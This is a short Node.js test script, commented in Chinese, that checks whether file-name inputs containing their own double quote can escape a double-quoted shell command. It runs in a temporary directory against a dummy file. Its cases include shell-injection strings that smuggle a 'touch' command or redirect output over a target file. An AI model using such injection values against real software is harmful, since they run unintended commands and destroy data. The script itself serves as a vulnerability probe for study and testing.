// 三條攻擊輸入蓋不到的那一族：輸入自帶一個雙引號，先把包住它的引號關掉。
//
//   node quote-boundary.mjs
//
// 為什麼要有這支：vuln.mjs 把字串插在一對雙引號裡，所以分號打不穿（probe 的 sep 那條）。
// 但那個「打不穿」只在輸入本身不含雙引號時成立，而檔名可以含雙引號。
import { execSync } from "node:child_process";
import { mkdtempSync, writeFileSync, statSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const cases = [
  ["分號（probe 的 sep）", (v, m) => `x; touch ${m};#`],
  ["自帶雙引號再用分號", (v, m) => `x"; touch ${m}; echo "`],
  ["自帶雙引號再重導向", (v, m) => `x" > ${v} #`],
  ["變數展開", () => "x$HOME"],
];

for (const [name, mk] of cases) {
  const dir = mkdtempSync(join(tmpdir(), "quote-"));
  const victim = join(dir, "important.txt");
  const marker = join(dir, "PWNED");
  writeFileSync(victim, "這是原本的內容\n");   // 22 位元組
  const before = statSync(victim).size;
  let out = "";
  try {
    out = execSync(`echo "dump ${mk(victim, marker)}"`, { encoding: "utf8" }).trim();
  } catch {
    out = "（丟例外）";
  }
  const after = statSync(victim).size;
  console.log([name, `目標檔 ${before}→${after} 位元組`,
    `標記檔 ${existsSync(marker) ? "有" : "沒有"}`,
    `輸出 ${JSON.stringify(out.slice(0, 30))}`].join("\t"));
  rmSync(dir, { recursive: true, force: true });
}
